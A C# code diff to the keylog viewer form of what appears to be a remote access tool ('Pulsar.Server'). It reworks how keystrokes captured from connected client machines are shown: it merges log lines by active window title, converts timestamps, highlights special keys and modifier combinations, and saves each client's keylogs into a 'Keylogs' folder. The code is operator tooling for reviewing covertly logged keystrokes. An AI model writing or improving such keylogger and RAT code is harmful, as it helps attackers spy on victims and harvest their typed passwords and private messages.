@@ -209,9 +209,6 @@ namespace Pulsar.Server.Forms
                 }
             });
         }
-        [System.Runtime.InteropServices.DllImport("user32.dll")]
-        private static extern IntPtr SendMessage(IntPtr hWnd, int msg, IntPtr wParam, IntPtr lParam);
-        private const int WM_SETREDRAW = 0x0B;
 
         private void RefreshSelectedLog()
         {
@@ -247,7 +244,7 @@ namespace Pulsar.Server.Forms
                             {
                                 rtbLogViewer.Clear();
                                 rtbLogViewer.Text = currentLogCache.ToString();
-                                ApplyGreenToHeaders();
+                                HighlightSpecialKeys();
                                 rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
                                 rtbLogViewer.ScrollToCaret();
                             });
@@ -294,6 +291,7 @@ namespace Pulsar.Server.Forms
             return string.Join(Environment.NewLine, result);
         }
 
+        // ------------------- MergeBrokenLines -------------------
         private string MergeBrokenLines(string content)
         {
             if (string.IsNullOrEmpty(content)) return content;
@@ -301,6 +299,7 @@ namespace Pulsar.Server.Forms
             var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
             var merged = new StringBuilder();
             string currentHeader = null;
+            string currentWindow = null; // track the generalized window name
             StringBuilder textBuffer = new StringBuilder();
 
             foreach (var line in lines)
@@ -308,27 +307,54 @@ namespace Pulsar.Server.Forms
                 var trimmed = line.Trim();
                 if (string.IsNullOrEmpty(trimmed)) continue;
 
-                if (trimmed.StartsWith("[") && trimmed.Contains("]"))
+                // Detect new window header (skip special keys)
+                if (trimmed.StartsWith("[") && trimmed.Contains("]") &&
+                    !trimmed.Contains("[Back]") && !trimmed.Contains("[Tab]") && !trimmed.Contains("[Esc]"))
                 {
-                    // Convert UTC to server local time
-                    string timePart = trimmed.Substring(1, Math.Min(8, trimmed.Length - 2)); // safely get HH:mm:ss
-                    if (DateTime.TryParseExact(timePart, "HH:mm:ss", null, System.Globalization.DateTimeStyles.AssumeUniversal, out DateTime utcTime))
-                    {
-                        var localTime = utcTime.ToLocalTime();
-                        if (trimmed.Length > 9)
-                            trimmed = $"[{localTime:hh:mm:ss tt}]" + trimmed.Substring(9);
-                        else
-                            trimmed = $"[{localTime:hh:mm:ss tt}]";
-                    }
+                    string processedHeader = trimmed;
+                    string generalizedWindow = null;
 
-                    if (currentHeader != null)
+                    // convert timestamp to server local time
+                    try
                     {
-                        merged.AppendLine(currentHeader);
-                        if (textBuffer.Length > 0)
-                            merged.AppendLine(textBuffer.ToString());
-                        textBuffer.Clear();
+                        var closeIdx = trimmed.IndexOf(']');
+                        if (closeIdx > 2)
+                        {
+                            var timePart = trimmed.Substring(1, Math.Min(8, closeIdx - 1));
+                            if (DateTime.TryParseExact(timePart, "HH:mm:ss", null,
+                                System.Globalization.DateTimeStyles.None, out DateTime parsedTime))
+                            {
+                                DateTime local = DateTime.Today.Add(parsedTime.TimeOfDay);
+                                string rest = closeIdx + 1 < trimmed.Length ? trimmed.Substring(closeIdx + 1) : string.Empty;
+
+                                // Generalize window title if present
+                                int dashIndex = rest.LastIndexOf('-');
+                                if (dashIndex >= 0)
+                                {
+                                    generalizedWindow = rest.Substring(dashIndex).Trim();
+                                    rest = " " + generalizedWindow; // keep only "- WindowName"
+                                }
+
+                                processedHeader = $"[{local:hh:mm:ss tt}]{rest}";
+                            }
+                        }
                     }
-                    currentHeader = trimmed;
+                    catch { }
+
+                    // Only treat as new header if window changed
+                    if (generalizedWindow != currentWindow)
+                    {
+                        if (currentHeader != null)
+                        {
+                            merged.AppendLine(currentHeader);
+                            if (textBuffer.Length > 0)
+                                merged.AppendLine(textBuffer.ToString());
+                            textBuffer.Clear();
+                        }
+
+                        currentHeader = processedHeader;
+                        currentWindow = generalizedWindow;
+                    }
                 }
                 else
                 {
@@ -346,22 +372,61 @@ namespace Pulsar.Server.Forms
             return merged.ToString();
         }
 
-        private void ApplyGreenToHeaders()
+        private void HighlightSpecialKeys()
         {
-            // Match headers like [hh:mm:ss AM/PM] at the start of a line
-            var regex = new System.Text.RegularExpressions.Regex(@"^\[\d{2}:\d{2}:\d{2} [AP]M\].*$", System.Text.RegularExpressions.RegexOptions.Multiline);
+            string text = rtbLogViewer.Text;
 
-            foreach (System.Text.RegularExpressions.Match match in regex.Matches(rtbLogViewer.Text))
+            // Highlight headers in lime green
+            var headerRegex = new System.Text.RegularExpressions.Regex(
+                @"^\[(\d{2}:\d{2}:\d{2} [AP]M)\].*$",
+                System.Text.RegularExpressions.RegexOptions.Multiline);
+
+            foreach (System.Text.RegularExpressions.Match match in headerRegex.Matches(text))
             {
                 rtbLogViewer.Select(match.Index, match.Length);
-                rtbLogViewer.SelectionColor = Color.LimeGreen; // keep headers green
+                rtbLogViewer.SelectionColor = Color.LimeGreen;
             }
 
-            // Reset selection to end
+            // Special keys to highlight
+            string[] specialKeys = {
+        "Back", "Del", "Tab", "Esc", "Enter",
+        "Up", "Down", "Left", "Right","LShift",
+        "F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12",
+        "F13","F14","F15","F16","F17","F18","F19","F20","F21","F22","F23","F24"
+    };
+
+            // Modifiers that can prefix special keys
+            string[] modifiers = { "Shift", "Ctrl", "Alt" };
+
+            // Regex pattern: match any number of modifiers + a special key
+            // Examples: [Back], [Shift][Del], [Ctrl][Alt][F5]
+            string pattern = @"(?:\[(?:" + string.Join("|", modifiers) + @")\])*" +
+                             @"\[(?:" + string.Join("|", specialKeys) + @")\]";
+
+            var specialKeyRegex = new System.Text.RegularExpressions.Regex(pattern);
+
+            foreach (System.Text.RegularExpressions.Match match in specialKeyRegex.Matches(text))
+            {
+                // Skip if inside a header
+                bool insideHeader = false;
+                foreach (System.Text.RegularExpressions.Match headerMatch in headerRegex.Matches(text))
+                {
+                    if (match.Index >= headerMatch.Index && match.Index < headerMatch.Index + headerMatch.Length)
+                    {
+                        insideHeader = true;
+                        break;
+                    }
+                }
+                if (insideHeader) continue;
+
+                rtbLogViewer.Select(match.Index, match.Length);
+                rtbLogViewer.SelectionColor = Color.Gold;
+            }
+
+            // Reset selection
             rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
             rtbLogViewer.SelectionColor = rtbLogViewer.ForeColor;
         }
-
 
         private void SafeInvoke(Action action)
         {
@@ -378,10 +443,8 @@ namespace Pulsar.Server.Forms
         {
             if (checkBox1.Checked)
             {
-                // Refresh log list
                 RefreshLogsDirectory();
 
-                // Select first log if any
                 if (lstLogs.Items.Count > 0)
                 {
                     lstLogs.Items[0].Selected = true;
@@ -402,10 +465,8 @@ namespace Pulsar.Server.Forms
 
         private void btnGetLogs_Click(object sender, EventArgs e)
         {
-            // Refresh log list
             RefreshLogsDirectory();
 
-            // Select first log if any
             if (lstLogs.Items.Count > 0)
             {
                 lstLogs.Items[0].Selected = true;
@@ -425,17 +486,14 @@ namespace Pulsar.Server.Forms
                     return;
                 }
 
-                // Base folder same as FileManager download folder
                 string clientFolder = _connectClient.Value.DownloadDirectory;
                 if (string.IsNullOrWhiteSpace(clientFolder))
                     clientFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Clients", "UnknownClient");
 
-                // Create Keylogs subfolder
                 string keylogFolder = Path.Combine(clientFolder, "Keylogs");
                 if (!Directory.Exists(keylogFolder))
                     Directory.CreateDirectory(keylogFolder);
 
-                // Save file with timestamp
                 string fileName = $"Keylog_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.txt";
                 string savePath = Path.Combine(keylogFolder, fileName);
 
@@ -449,6 +507,9 @@ namespace Pulsar.Server.Forms
             }
         }
 
+        private void button3_Click(object sender, EventArgs e)
+        {
 
+        }
     }
 }
